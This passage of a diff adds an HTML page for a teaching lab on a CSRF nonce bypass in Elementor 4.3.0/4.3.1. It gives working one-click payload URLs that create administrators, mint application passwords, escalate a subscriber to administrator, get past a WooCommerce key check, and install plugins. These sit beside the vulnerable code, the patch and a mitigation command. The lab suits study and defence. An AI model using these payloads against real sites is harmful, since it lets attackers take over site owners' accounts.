@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Elementor CSRF Lab · un clic, un admin — laboratorio pedagógico</title>
+<meta name="description" content="Laboratorio pedagógico del CSRF en Elementor 4.3.0/4.3.1 (bypass del nonce REST vía Editor Events): un clic de un admin crea otro administrador. Docker, fases reproducibles, control negativo 4.3.2, aportaciones propias verificadas.">
+<meta name="author" content="686f6c61">
+<meta name="theme-color" content="#0b1220">
+<link rel="canonical" href="https://686f6c61.github.io/POC-ELEMENTOR-CSRF/">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='22' fill='%230b1220'/%3E%3Ctext x='50' y='70' font-size='54' text-anchor='middle' fill='%2338bdf8' font-family='monospace' font-weight='bold'%3E%E2%9A%A1%3C/text%3E%3C/svg%3E">
+<!-- Open Graph -->
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Elementor CSRF Lab">
+<meta property="og:title" content="Elementor CSRF Lab · un clic, un admin">
+<meta property="og:description" content="CSRF en Elementor 4.3.0/4.3.1: la subcadena elementor/v1/events/ en la query apaga el nonce del REST API de WordPress. Lab Docker con control negativo 4.3.2 y aportaciones propias verificadas.">
+<meta property="og:url" content="https://686f6c61.github.io/POC-ELEMENTOR-CSRF/">
+<meta property="og:image" content="https://686f6c61.github.io/POC-ELEMENTOR-CSRF/img/og.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="Elementor CSRF Lab: GET /wp-json/wp/v2/users?_method=POST&...&x=elementor/v1/events/ — un clic crea un admin.">
+<meta property="og:locale" content="es_ES">
+<meta property="og:locale:alternate" content="en_US">
+<meta property="og:see_also" content="https://github.com/686f6c61">
+<meta property="og:see_also" content="https://patchstack.com/articles/cross-site-request-forgery-in-elementor-plugin-affecting-2-million-sites">
+<meta property="og:see_also" content="https://blog.elhacker.net/2026/09/vulnerabilidad-en-elementor-para.html">
+<!-- Twitter / X -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Elementor CSRF Lab · un clic, un admin">
+<meta name="twitter:description" content="La subcadena elementor/v1/events/ viaja en la query de un enlace y apaga el nonce del REST API. Un clic = un administrador. Lab Docker, 4.3.1 vs 4.3.2.">
+<meta name="twitter:image" content="https://686f6c61.github.io/POC-ELEMENTOR-CSRF/img/og.png">
+<meta name="twitter:creator" content="@686f6c61">
+<meta name="twitter:site" content="@686f6c61">
+<style>
+  :root{
+    --bg:#0b1220; --bg2:#111a2c; --fg:#e2e8f0; --dim:#94a3b8; --acc:#38bdf8;
+    --bad:#f87171; --good:#4ade80; --warn:#fbbf24; --line:#1e293b; --code:#0a0f1c;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--fg);
+    font:16px/1.65 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+  a{color:var(--acc);text-decoration:none} a:hover{opacity:.8}
+  .wrap{max-width:1000px;margin:0 auto;padding:0 20px}
+  header{padding:56px 0 28px;border-bottom:1px solid var(--line);
+    background:linear-gradient(180deg,#0d1526,#0b1220);position:relative}
+  h1{font-size:2.1rem;margin:0 0 6px;letter-spacing:-.02em}
+  h1 .cve{color:var(--acc);font-family:ui-monospace,monospace}
+  h1 .bad{color:var(--bad)}
+  .tagline{color:var(--dim);margin:0}
+  .badges{margin-top:14px;display:flex;flex-wrap:wrap;gap:8px}
+  .badge{font:600 12px/1 ui-monospace,monospace;color:var(--fg);
+    background:var(--bg2);border:1px solid var(--line);border-radius:999px;padding:6px 12px}
+  .badge.red{color:var(--bad);border-color:#47201f}
+  .badge.green{color:var(--good);border-color:#1f4731}
+  .badge.amber{color:var(--warn);border-color:#3b311d}
+  .lang{position:absolute;top:16px;right:20px;display:flex;gap:6px}
+  .lang button{background:var(--bg2);color:var(--dim);border:1px solid var(--line);
+    border-radius:8px;padding:5px 12px;cursor:pointer;font:600 13px system-ui}
+  .lang button.on{color:var(--acc);border-color:var(--acc)}
+  section{padding:34px 0;border-bottom:1px solid var(--line)}
+  h2{font-size:1.35rem;margin:0 0 16px;letter-spacing:-.01em}
+  h2 .n{color:var(--acc);font-family:ui-monospace,monospace;margin-right:8px}
+  h3{font-size:1rem;margin:18px 0 8px}
+  p{margin:8px 0}
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px}
+  .card{background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:16px 18px}
+  .card h3{margin:0 0 8px;font-size:1rem}
+  .card p{margin:0;color:var(--dim);font-size:.92rem}
+  .step{display:flex;gap:14px;margin:14px 0}
+  .step .num{flex:none;width:34px;height:34px;border-radius:10px;display:grid;place-items:center;
+    background:#12202e;color:var(--acc);font:700 15px ui-monospace,monospace;border:1px solid #1c3247}
+  .step div p{margin:2px 0;color:var(--dim);font-size:.95rem}
+  .step b{color:var(--fg)}
+  pre{background:var(--code);border:1px solid var(--line);border-radius:10px;
+    padding:14px 16px;overflow:auto;font:13.5px/1.6 ui-monospace,"Cascadia Mono",monospace}
+  pre .k{color:#c084fc} pre .s{color:#86efac} pre .c{color:#64748b}
+  pre .r{color:var(--bad)} pre .g{color:var(--good)} pre .a{color:var(--warn)}
+  table{border-collapse:collapse;width:100%;font-size:.9rem;margin:10px 0}
+  th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top}
+  th{background:var(--bg2);color:var(--dim);font-weight:600;font-size:.78rem;text-transform:uppercase;letter-spacing:.04em}
+  code{font-family:ui-monospace,monospace;background:var(--code);border:1px solid var(--line);
+    border-radius:6px;padding:1px 6px;font-size:.88em;color:#a5d6ff}
+  .verdict{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:14px;margin-top:10px}
+  .verdict .v{border-radius:12px;padding:14px 16px;font-size:.9rem}
+  .v.vuln{background:#1c1113;border:1px solid #47201f}
+  .v.parche{background:#0f1a13;border:1px solid #1f4731}
+  .v h4{margin:0 0 6px;font-family:ui-monospace,monospace;font-size:.85rem}
+  .v.vuln h4{color:var(--bad)} .v.parche h4{color:var(--good)}
+  footer{padding:26px 0 48px;color:var(--dim);font-size:.85rem}
+  .qs{background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:18px 20px}
+  .qs pre{margin:10px 0 0}
+  .qs .cmd{color:var(--acc)}
+  .gallery{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:14px;margin:12px 0}
+  .shot{background:var(--bg2);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:0}
+  .shot img{width:100%;display:block;border-bottom:1px solid var(--line);cursor:zoom-in}
+  #lightbox{position:fixed;inset:0;background:rgba(4,8,14,.94);display:none;
+    flex-direction:column;align-items:center;justify-content:center;z-index:60;
+    padding:28px;cursor:zoom-out}
+  #lightbox.abierto{display:flex}
+  #lightbox img{max-width:min(1500px,94vw);max-height:82vh;border:1px solid var(--line);
+    border-radius:8px;background:#000}
+  #lightbox figcaption{color:var(--dim);font-size:.9rem;margin-top:12px;max-width:900px;text-align:center}
+  .shot figcaption{padding:10px 14px;font-size:.85rem;color:var(--dim)}
+  .tl{list-style:none;margin:14px 0;padding:0;border-left:2px solid #1c3247}
+  .tl li{position:relative;padding:0 0 16px 22px;margin:0}
+  .tl li::before{content:"";position:absolute;left:-7px;top:5px;width:12px;height:12px;
+    border-radius:50%;background:#12202e;border:2px solid var(--acc)}
+  .tl time{font-family:ui-monospace,monospace;color:var(--acc);font-size:.85rem}
+  .tl p{margin:2px 0 0;color:var(--dim);font-size:.92rem}
+  .tree{font:12.5px/1.7 ui-monospace,monospace;color:#a5d6ff}
+  .ok{color:var(--good);font-weight:600} .ko{color:var(--bad);font-weight:600}
+  details{background:var(--bg2);border:1px solid var(--line);border-radius:10px;padding:12px 16px;margin:10px 0}
+  summary{cursor:pointer;font-weight:600;font-size:.95rem}
+  details p,details li{color:var(--dim);font-size:.92rem}
+  details ul{margin:6px 0;padding-left:20px}
+  .num-mono{font-family:ui-monospace,monospace}
+</style>
+</head>
+<body>
+<header>
+  <div class="lang">
+    <button id="btn-es" class="on" onclick="setLang('es')">ES</button>
+    <button id="btn-en" onclick="setLang('en')">EN</button>
+  </div>
+  <div class="wrap">
+    <h1><span class="cve">Elementor 4.3.0/4.3.1</span> · <span class="bad">un clic, un admin</span></h1>
+    <p class="tagline" data-es="CSRF con bypass del nonce REST vía «Editor Events»: la subcadena elementor/v1/events/ viaja en la query de un enlace y apaga la única defensa CSRF del REST API de WordPress."
+                       data-en="CSRF with REST nonce bypass via “Editor Events”: the substring elementor/v1/events/ rides in a link’s query string and switches off the WordPress REST API’s only CSRF defense.">CSRF con bypass del nonce REST vía «Editor Events»: la subcadena elementor/v1/events/ viaja en la query de un enlace y apaga la única defensa CSRF del REST API de WordPress.</p>
+    <div class="badges">
+      <span class="badge red">CVSS 8.8 · Patchstack</span>
+      <span class="badge" data-es="Elementor 4.3.0 / 4.3.1 · ~2M sitios" data-en="Elementor 4.3.0 / 4.3.1 · ~2M sites">Elementor 4.3.0 / 4.3.1 · ~2M sitios</span>
+      <span class="badge green" data-es="Parche: 4.3.2 · 2026-09-24" data-en="Fix: 4.3.2 · 2026-09-24">Parche: 4.3.2 · 2026-09-24</span>
+      <span class="badge amber" data-es="Descubierto por Saggre" data-en="Found by Saggre">Descubierto por Saggre</span>
+      <span class="badge" data-es="Lab Docker local · control negativo" data-en="Local Docker lab · negative control">Lab Docker local · control negativo</span>
+    </div>
+  </div>
+</header>
+
+<section>
+  <div class="wrap">
+    <h2><span class="n">00</span><span data-es="Uso responsable" data-en="Responsible use">Uso responsable</span></h2>
+    <div class="grid">
+      <div class="card"><h3 style="color:var(--good)" data-es="Sí" data-en="Yes">Sí</h3>
+        <p data-es="Aprender el bug y su parche · enseñar defensa (IOCs incluidos) · probarte en localhost · verificar que tu sitio ya está en 4.3.2."
+           data-en="Learn the bug and its patch · teach defense (IOCs included) · test yourself on localhost · check your site already runs 4.3.2.">Aprender el bug y su parche · enseñar defensa (IOCs incluidos) · probarte en localhost · verificar que tu sitio ya está en 4.3.2.</p></div>
+      <div class="card"><h3 style="color:var(--bad)" data-es="No" data-en="No">No</h3>
+        <p data-es="Atacar sistemas ajenos · crear administradores donde no te pertenece la cuenta · cualquier uso con ánimo de daño."
+           data-en="Attack other people’s systems · create administrators where the account isn’t yours · any use intended to cause harm.">Atacar sistemas ajenos · crear administradores donde no te pertenece la cuenta · cualquier uso con ánimo de daño.</p></div>
+    </div>
+    <p style="font-size:.92rem;margin:14px 0" data-es="<b>Sobre la procedencia del material.</b> Todo lo que este laboratorio replica era público antes de este repositorio: el vector canónico procede del <a href='https://patchstack.com/articles/cross-site-request-forgery-in-elementor-plugin-affecting-2-million-sites' target='_blank' rel='noopener'>advisory de Patchstack</a> (hallazgo de Saggre) y el análisis del parche, del <a href='https://blog.elhacker.net/2026/09/vulnerabilidad-en-elementor-para.html' target='_blank' rel='noopener'>código publicado por Elementor</a>. Las aportaciones propias (sección 03b) son de análisis, superficie ampliada y defensa, verificadas contra el lab."
+                    data-en="<b>On the origin of the material.</b> Everything this lab replicates was public before this repository: the canonical vector comes from the <a href='https://patchstack.com/articles/cross-site-request-forgery-in-elementor-plugin-affecting-2-million-sites' target='_blank' rel='noopener'>Patchstack advisory</a> (found by Saggre) and the patch analysis from Elementor’s published code. Our own contributions (section 03b) are analytical and defensive, verified against the lab."><b>Sobre la procedencia del material.</b> Todo lo que este laboratorio replica era público antes de este repositorio: el vector canónico procede del <a href="https://patchstack.com/articles/cross-site-request-forgery-in-elementor-plugin-affecting-2-million-sites" target="_blank" rel="noopener">advisory de Patchstack</a> (hallazgo de Saggre) y el análisis del parche, del código publicado por Elementor. Las aportaciones propias (sección 03b) son de análisis, superficie ampliada y defensa, verificadas contra el lab.</p>
+    <p style="color:var(--dim);font-size:.85rem;margin-top:14px" data-es="El CLI (<code>cli/poc.py</code>) exige <code>--acepta-responsabilidad</code> para las fases invasivas y se niega a operar fuera de localhost. <code>make clean</code> destruye todo el laboratorio."
+                                                        data-en="The CLI (<code>cli/poc.py</code>) requires <code>--acepta-responsabilidad</code> for invasive phases and refuses non-local hosts. <code>make clean</code> destroys the whole lab.">El CLI (<code>cli/poc.py</code>) exige <code>--acepta-responsabilidad</code> para las fases invasivas y se niega a operar fuera de localhost. <code>make clean</code> destruye todo el laboratorio.</p>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <h2><span class="n">01</span><span data-es="El arma es un enlace (payload completo)" data-en="The weapon is a link (full payload)">El arma es un enlace (payload completo)</span></h2>
+    <pre data-es="GET http://VICTIMA/wp-json/wp/v2/users?_method=POST
+    &amp;username=csrfadmin&amp;email=csrfadmin@lab.test&amp;password=csrfadmin-PoC-2026
+    &amp;roles[]=<span class='r'>administrator</span>&amp;<span class='a'>x=elementor/v1/events/</span>          <span class='c'>&lt;-- la subcadena mágica</span>
+
+<span class='c'># tres piezas en un solo GET:</span>
+<span class='a'>x=elementor/v1/events/</span>   apaga el nonce (el nombre del parámetro da igual)
+<span class='k'>_method=POST</span>             el REST Server de WP ejecuta el GET como POST
+<span class='s'>username/email/password/roles[]</span>   parámetros que el controlador de usuarios lee de la query" data-en="GET http://VICTIM/wp-json/wp/v2/users?_method=POST
+    &amp;username=csrfadmin&amp;email=csrfadmin@lab.test&amp;password=csrfadmin-PoC-2026
+    &amp;roles[]=<span class='r'>administrator</span>&amp;<span class='a'>x=elementor/v1/events/</span>          <span class='c'>&lt;-- the magic substring</span>
+
+<span class='c'># three pieces in a single GET:</span>
+<span class='a'>x=elementor/v1/events/</span>   switches the nonce off (parameter name is irrelevant)
+<span class='k'>_method=POST</span>             WP’s REST Server runs the GET as a POST
+<span class='s'>username/email/password/roles[]</span>   params the users controller reads from the query">GET http://VICTIMA/wp-json/wp/v2/users?_method=POST
+    &amp;username=csrfadmin&amp;email=csrfadmin@lab.test&amp;password=csrfadmin-PoC-2026
+    &amp;roles[]=<span class="r">administrator</span>&amp;<span class="a">x=elementor/v1/events/</span>          <span class="c">&lt;-- la subcadena mágica</span>
+
+<span class="c"># tres piezas en un solo GET:</span>
+<span class="a">x=elementor/v1/events/</span>   apaga el nonce (el nombre del parámetro da igual)
+<span class="k">_method=POST</span>             el REST Server de WP ejecuta el GET como POST
+<span class="s">username/email/password/roles[]</span>   parámetros que el controlador de usuarios lee de la query</pre>
+    <div class="grid">
+      <div class="card"><h3 data-es="Sin JavaScript" data-en="No JavaScript">Sin JavaScript</h3>
+        <p data-es="Un <code>&amp;lt;a href&amp;gt;</code> en un correo, chat o comentario. Nada de <code>&amp;lt;script&amp;gt;</code>, <code>&amp;lt;form&amp;gt;</code> ni fetch."
+           data-en="An <code>&amp;lt;a href&amp;gt;</code> in an email, chat or comment. No <code>&amp;lt;script&amp;gt;</code>, no <code>&amp;lt;form&amp;gt;</code>, no fetch.">Un <code>&lt;a href&gt;</code> en un correo, chat o comentario. Nada de <code>&lt;script&gt;</code>, <code>&lt;form&gt;</code> ni fetch.</p></div>
+      <div class="card"><h3 data-es="SameSite no lo frena" data-en="SameSite doesn’t stop it">SameSite no lo frena</h3>
+        <p data-es="WP no fija SameSite en sus cookies (verificado); el navegador aplica Lax, y Lax permite cookies en la navegación de nivel superior — justo lo que produce un clic."
+           data-en="WP sets no SameSite on its cookies (verified); browsers default to Lax, and Lax sends cookies on top-level navigation — exactly what a click produces.">WP no fija SameSite en sus cookies (verificado); el navegador aplica Lax, y Lax permite cookies en la navegación de nivel superior — justo lo que produce un clic.</p></div>
+      <div class="card"><h3 data-es="Un solo clic" data-en="One click">Un solo clic</h3>
+        <p data-es="La víctima debe tener sesión (típicamente admin). Basta un clic: el navegador envía el GET con sus cookies y el REST API lo ejecuta autenticado."
+           data-en="The victim needs a session (typically admin). One click: the browser sends the GET with their cookies and the REST API runs it authenticated.">La víctima debe tener sesión (típicamente admin). Basta un clic: el navegador envía el GET con sus cookies y el REST API lo ejecuta autenticado.</p></div>
+    </div>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <h2><span class="n">02</span><span data-es="El bug, paso a paso" data-en="The bug, step by step">El bug, paso a paso</span></h2>
+    <div class="step"><div class="num">1</div><div>
+      <p><b data-es="Cómo defiende WP el REST API" data-en="How WP defends REST">Cómo defiende WP el REST API</b></p>
+      <p data-es="Autenticado por cookies, el nonce <code>wp_rest</code> es la única defensa CSRF. Sin nonce válido, <code>rest_cookie_check_errors()</code> degrada al usuario a anónimo: con cookies pero sin nonce no eres nadie."
+         data-en="For cookie-authenticated requests the <code>wp_rest</code> nonce is the only CSRF defense. Without a valid nonce, <code>rest_cookie_check_errors()</code> downgrades you to anonymous: cookies without a nonce make you nobody.">Autenticado por cookies, el nonce <code>wp_rest</code> es la única defensa CSRF. Sin nonce válido, <code>rest_cookie_check_errors()</code> degrada al usuario a anónimo: con cookies pero sin nonce no eres nadie.</p></div></div>
+    <div class="step"><div class="num">2</div><div>
+      <p><b data-es="Lo que añadió Elementor 4.3.0 (Editor Events)" data-en="What Elementor 4.3.0 added (Editor Events)">Lo que añadió Elementor 4.3.0 (Editor Events)</b></p>
+      <p data-es="Un filtro sobre <code>rest_authentication_errors</code> con <b>prioridad 0</b> que devuelve <code>true</code> («no valides nada») si el <b>URI crudo</b> contiene la subcadena <code>elementor/v1/events/</code>."
+         data-en="A filter on <code>rest_authentication_errors</code> at <b>priority 0</b> returning <code>true</code> (“skip validation”) when the <b>raw URI</b> contains the substring <code>elementor/v1/events/</code>.">Un filtro sobre <code>rest_authentication_errors</code> con <b>prioridad 0</b> que devuelve <code>true</code> («no valides nada») si el <b>URI crudo</b> contiene la subcadena <code>elementor/v1/events/</code>.</p></div></div>
+    <div class="step"><div class="num">3</div><div>
+      <p><b data-es="El error de temporización" data-en="The timing flaw">El error de temporización</b></p>
+      <p data-es="El filtro corre <b>antes del routing</b>: WordPress aún no sabe qué ruta se pide, así que solo queda inspeccionar el URI sin procesar — que incluye la <b>query string del atacante</b>."
+         data-en="The filter runs <b>before routing</b>: WordPress doesn’t know the route yet, so the only thing to inspect is the unprocessed URI — which includes the <b>attacker’s query string</b>.">El filtro corre <b>antes del routing</b>: WordPress aún no sabe qué ruta se pide, así que solo queda inspeccionar el URI sin procesar — que incluye la <b>query string del atacante</b>.</p></div></div>
+    <div class="step"><div class="num">4</div><div>
+      <p><b data-es="La caída en cadena" data-en="The chain reaction">La caída en cadena</b></p>
+      <p data-es="Elementor devuelve <code>true</code> (prioridad 0) → <code>rest_cookie_check_errors()</code> del core (prioridad 100) ve <code>$result</code> no vacío y <b>retorna antes de validar el nonce</b> → la petición navega como admin sin nonce → todo endpoint cuyo <code>permission_callback</code> solo mire <code>current_user_can()</code> queda expuesto: 154 endpoints de escritura en una instalación base (core y plugins)."
+         data-en="Elementor returns <code>true</code> (priority 0) → core’s <code>rest_cookie_check_errors()</code> (priority 100) sees a non-empty <code>$result</code> and <b>returns before validating the nonce</b> → the request runs as admin without a nonce → every endpoint whose <code>permission_callback</code> only checks <code>current_user_can()</code> is exposed: 154 write endpoints on a base install (core and plugins).">Elementor devuelve <code>true</code> (prioridad 0) → <code>rest_cookie_check_errors()</code> del core (prioridad 100) ve <code>$result</code> no vacío y <b>retorna antes de validar el nonce</b> → la petición navega como admin sin nonce → todo endpoint cuyo <code>permission_callback</code> solo mire <code>current_user_can()</code> queda expuesto: 154 endpoints de escritura en una instalación base (core y plugins).</p></div></div>
+    <details>
+      <summary data-es="El código vulnerable, al completo" data-en="The vulnerable code, in full">El código vulnerable, al completo</summary>
+      <pre>add_filter( 'rest_authentication_errors', [ $this, 'bypass_nonce_check_for_own_routes' ], <span class="a">0</span> );
+
+public function bypass_nonce_check_for_own_routes( $result ) {
+    if ( $this->is_own_route_request() ) {
+        return <span class="r">true</span>;   <span class="c">// "ya no hace falta validar nada"</span>
+    }
+    return $result;
+}
+
+private function is_own_route_request(): bool {
+    $request_uri = Utils::get_super_global_value( $_SERVER, 'REQUEST_URI' ) ?? '';
+    <span class="c">// subcadena SIN anclar sobre el URI crudo (path + query string)</span>
+    return <span class="r">false !== strpos</span>( $request_uri, 'elementor/v1/events/' );
+}</pre>
+    </details>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <h2><span class="n">03</span><span data-es="El parche: deja de mirar la URL cruda" data-en="The patch: stop trusting the raw URL">El parche: deja de mirar la URL cruda</span></h2>
+    <pre>private function is_own_route_request(): bool {
+<span class="r">-   $request_uri = Utils::get_super_global_value( $_SERVER, 'REQUEST_URI' ) ?? '';
+-   return false !== strpos( $request_uri, 'elementor/v1/events/' );</span>
+<span class="g">+   global $wp;
++   $route = $wp->query_vars['rest_route'] ?? null;      <span class="c">// ruta YA resuelta: sin query string</span>
++   if ( ! is_string( $route ) ) { return false; }
++   return <span class="g">0 === strpos</span>( $route, '/elementor/v1/events/' );  <span class="c">// anclada al principio</span>
+}</pre>
+    <p data-es="Tres movimientos: fuente de verdad (la ruta resuelta por el router, sin la query del atacante), anclaje (<code>0 ===</code> en vez de «contiene») y guard de tipado. La subcadena mágica deja de poder viajar en la URL. En el mismo parche, además, el proxy deja de reenviar la cabecera <code>Authorization</code> de la petición original a Mixpanel (cambio de privacidad: forense completo en <code>research/PARCHE.md</code>)."
+       data-en="Three moves: source of truth (the router-resolved route, without the attacker’s query), anchoring (<code>0 ===</code> instead of “contains”), and a type guard. The magic substring can no longer travel in the URL. The same patch also stops forwarding the original request’s <code>Authorization</code> header to Mixpanel (privacy change: full forensics in <code>research/PARCHE.md</code>).">Tres movimientos: fuente de verdad (la ruta resuelta por el router, sin la query del atacante), anclaje (<code>0 ===</code> en vez de «contiene») y guard de tipado. La subcadena mágica deja de poder viajar en la URL. En el mismo parche, además, el proxy deja de reenviar la cabecera <code>Authorization</code> de la petición original a Mixpanel (cambio de privacidad: forense completo en <code>research/PARCHE.md</code>).</p>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <h2><span class="n">03b</span><span data-es="Aportaciones de este laboratorio al campo" data-en="This lab’s contributions to the field">Aportaciones de este laboratorio al campo</span></h2>
+    <p data-es="Más allá de la réplica del advisory: superficie, persistencia y defensa — todo verificado contra el lab y reproducible con <code>make aportaciones</code> / <code>make hardening-demo</code>."
+       data-en="Beyond replicating the advisory: surface, persistence and defense — all verified against the lab and reproducible with <code>make aportaciones</code> / <code>make hardening-demo</code>.">Más allá de la réplica del advisory: superficie, persistencia y defensa — todo verificado contra el lab y reproducible con <code>make aportaciones</code> / <code>make hardening-demo</code>.</p>
+
+    <h3><span class="num-mono" style="color:var(--bad)">§1</span> <span data-es="«Puerta silenciosa»: application password en la cuenta del admin" data-en="“Stealth door”: application password on the admin’s own account">«Puerta silenciosa»: application password en la cuenta del admin</span></h3>
+    <pre data-es="GET /wp-json/wp/v2/users/me/application-passwords?_method=POST&amp;name=sync-movil&amp;<span class='a'>x=elementor/v1/events/</span>
+<span class='g'>-&gt; HTTP 201   {"password":"3wIC MOmN 0cwz 7yym PK6m ErfG","user_login":"admin",...}</span>
+
+<span class='c'># y esa credencial ya no necesita NI cookies NI nonce:</span>
+curl -u admin:**** /wp/v2/users/me?context=edit  <span class='g'>-&gt; 200, roles=["administrator"]</span>" data-en="GET /wp-json/wp/v2/users/me/application-passwords?_method=POST&amp;name=sync-movil&amp;<span class='a'>x=elementor/v1/events/</span>
+<span class='g'>-&gt; HTTP 201   {"password":"3wIC MOmN 0cwz 7yym PK6m ErfG","user_login":"admin",...}</span>
+
+<span class='c'># and that credential needs NEITHER cookies NOR a nonce:</span>
+curl -u admin:**** /wp/v2/users/me?context=edit  <span class='g'>-&gt; 200, roles=["administrator"]</span>">GET /wp-json/wp/v2/users/me/application-passwords?_method=POST&amp;name=sync-movil&amp;<span class="a">x=elementor/v1/events/</span>
+<span class="g">-&gt; HTTP 201   {"password":"3wIC MOmN 0cwz 7yym PK6m ErfG","user_login":"admin",...}</span>
+
+<span class="c"># y esa credencial ya no necesita NI cookies NI nonce:</span>
+curl -u admin:**** /wp/v2/users/me?context=edit  <span class="g">-&gt; 200, roles=["administrator"]</span></pre>
+    <p data-es="Persistencia <b>sin crear usuarios</b>: la contraseña llega en claro en la respuesta del propio GET y a partir de ahí el atacante usa Basic auth. Disponible en cualquier sitio HTTPS de producción (requisito de los Application Passwords)."
+       data-en="Persistence <b>without creating users</b>: the password arrives in cleartext in the GET’s own response, and from then on the attacker uses Basic auth. Available on any production HTTPS site (the Application Passwords requirement).">Persistencia <b>sin crear usuarios</b>: la contraseña llega en claro en la respuesta del propio GET y a partir de ahí el atacante usa Basic auth. Disponible en cualquier sitio HTTPS de producción (requisito de los Application Passwords).</p>
+
+    <h3><span class="num-mono" style="color:var(--bad)">§2</span> <span data-es="«Escalada de cuenta dormida»: subscriber → administrator" data-en="“Dormant account escalation”: subscriber → administrator">«Escalada de cuenta dormida»: subscriber → administrator</span></h3>
+    <pre data-es="GET /wp-json/wp/v2/users/3?_method=POST&amp;roles[]=<span class='r'>administrator</span>&amp;<span class='a'>x=elementor/v1/events/</span>
+<span class='g'>-&gt; HTTP 200   roles: subscriber -&gt; administrator (verificado con WP-CLI)</span>" data-en="GET /wp-json/wp/v2/users/3?_method=POST&amp;roles[]=<span class='r'>administrator</span>&amp;<span class='a'>x=elementor/v1/events/</span>
+<span class='g'>-&gt; HTTP 200   roles: subscriber -&gt; administrator (verified via WP-CLI)</span>">GET /wp-json/wp/v2/users/3?_method=POST&amp;roles[]=<span class="r">administrator</span>&amp;<span class="a">x=elementor/v1/events/</span>
+<span class="g">-&gt; HTTP 200   roles: subscriber -&gt; administrator (verificado con WP-CLI)</span></pre>
+    <p data-es="Si el atacante ya tiene una cuenta de baja confianza, el clic promueve <b>esa</b> cuenta: cero altas de usuario, la cuenta lleva meses dormida y las alertas de «usuarios nuevos» no disparan."
+       data-en="If the attacker already holds a low-trust account, the click promotes <b>that</b> account: zero new users, the account has been dormant for months, and “new user” alerts never fire.">Si el atacante ya tiene una cuenta de baja confianza, el clic promueve <b>esa</b> cuenta: cero altas de usuario, la cuenta lleva meses dormida y las alertas de «usuarios nuevos» no disparan.</p>
+
+    <h3><span class="num-mono" style="color:var(--bad)">§3</span> <span data-es="El bypass también anula el hardening anti-CSRF" data-en="The bypass also defeats anti-CSRF hardening">El bypass también anula el hardening anti-CSRF</span></h3>
+    <pre data-es="mu-plugin (patrón canónico de plugins de seguridad):
+  rest_authentication_errors @ 10  -&gt; denegar cookies-sin-nonce (401 rest_cookie_disabled)
+
+<span class='c'>[A]</span> ataque SIN subcadena    -&gt; <span class='ok'>401 el firewall bloquea</span>   ✔ el hardening funciona
+<span class='c'>[B]</span> ataque CON subcadena    -&gt; <span class='ko'>201 admin creado</span>        ✘ Elementor habló antes (prioridad 0)
+                                    y el hardening calló (if (!empty($result)) return $result;)" data-en="mu-plugin (canonical security-plugin pattern):
+  rest_authentication_errors @ 10  -&gt; deny cookies-without-nonce (401 rest_cookie_disabled)
+
+<span class='c'>[A]</span> attack WITHOUT substring -&gt; <span class='ok'>401 firewall blocks it</span>  ✔ the hardening works
+<span class='c'>[B]</span> attack WITH substring    -&gt; <span class='ko'>201 admin created</span>       ✘ Elementor spoke first (priority 0)
+                                    and the hardening stayed silent (if (!empty($result)) return $result;)">mu-plugin (patrón canónico de plugins de seguridad):
+  rest_authentication_errors @ 10  -&gt; denegar cookies-sin-nonce (401 rest_cookie_disabled)
+
+<span class="c">[A]</span> ataque SIN subcadena    -&gt; <span class="ok">401 el firewall bloquea</span>   ✔ el hardening funciona
+<span class="c">[B]</span> ataque CON subcadena    -&gt; <span class="ko">201 admin creado</span>        ✘ Elementor habló antes (prioridad 0)
+                                    y el hardening calló (if (!empty($result)) return $result;)</pre>
+    <p data-es="La defensa en profundidad diseñada contra esta clase exacta de ataque queda silenciada por el propio bug: hasta actualizar, «bloquear REST por cookies» NO protege. Mitigación real sin actualizar: <code>wp option update elementor_experiment-editor_events inactive</code>."
+       data-en="The defense-in-depth designed against exactly this attack class is silenced by the bug itself: until you update, “block cookie REST” does NOT protect. Real mitigation without updating: <code>wp option update elementor_experiment-editor_events inactive</code>.">La defensa en profundidad diseñada contra esta clase exacta de ataque queda silenciada por el propio bug: hasta actualizar, «bloquear REST por cookies» NO protege. Mitigación real sin actualizar: <code>wp option update elementor_experiment-editor_events inactive</code>.</p>
+
+    <h3><span class="num-mono" style="color:var(--bad)">§5</span> <span data-es="La API-key-wall de WOOCOMMERCE también cae" data-en="WooCommerce’s API-key wall falls too">La API-key-wall de WOOCOMMERCE también cae</span></h3>
+    <pre data-es="WooCommerce 11.1.2 (exige API keys, no cookies, en /wc/v3):
+GET /wc/v3/system_status                     (cookies admin) -&gt; <span class='ok'>401 woocommerce_rest_cannot_view</span>
+GET /wc/v3/system_status?x=elementor/v1/events/               -&gt; <span class='ko'>200 {"environment":...}</span>
+
+<span class='c'># y el endpoint de plugins del core, con dos enlaces:</span>
+GET /wp-json/wp/v2/plugins?_method=POST&amp;slug=hello-dolly&amp;x=...   <span class='ko'>-&gt; 201</span> (instalado)
+GET /wp-json/wp/v2/plugins/hello?_method=POST&amp;status=active&amp;x=... <span class='ko'>-&gt; 200</span> (activo)" data-en="WooCommerce 11.1.2 (requires API keys, not cookies, on /wc/v3):
+GET /wc/v3/system_status                     (admin cookies) -&gt; <span class='ok'>401 woocommerce_rest_cannot_view</span>
+GET /wc/v3/system_status?x=elementor/v1/events/               -&gt; <span class='ko'>200 {"environment":...}</span>
+
+<span class='c'># and core's plugins endpoint, with two links:</span>
